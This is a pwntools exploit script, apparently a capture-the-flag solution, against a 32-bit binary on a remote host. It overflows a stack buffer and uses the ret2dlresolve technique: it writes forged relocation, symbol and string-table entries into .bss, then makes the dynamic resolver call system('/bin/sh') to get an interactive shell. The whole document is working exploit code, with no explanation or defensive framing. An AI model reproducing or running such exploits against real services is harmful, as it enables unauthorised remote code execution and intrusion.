from pwn import *
context.log_level = "debug"
r=remote("10.132.141.34",10000)
elf=ELF("./pwn")

off = 0x1dc4
r_offset = 0x804a010  # elf.got['alarm']
r_info = 0x1f307
st_name = 0x1ea0
bss = 0x804a100
pop3 = 0x080485d9
plt = 0x08048380

Rel = p32(r_offset) + p32(r_info) + p32(0)                  # fake .rel.plt
Sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)            # fake .dynsym
Str = "system\x00\x00"                                      # fake .dynstr

data = Rel + Sym + Str + "/bin/sh\x00"

sh = 'a'*0x28 + 'a'*0x4 
sh += p32(elf.plt['read']) + p32(pop3) + p32(0) + p32(bss) + p32(0x100)     # read fake data to bss
sh += p32(plt) + p32(off) + p32(0xdeadbeef) + p32(0x804a124)                # call system("bin/sh")

r.sendline(sh)
r.sendline(data)
r.interactive()
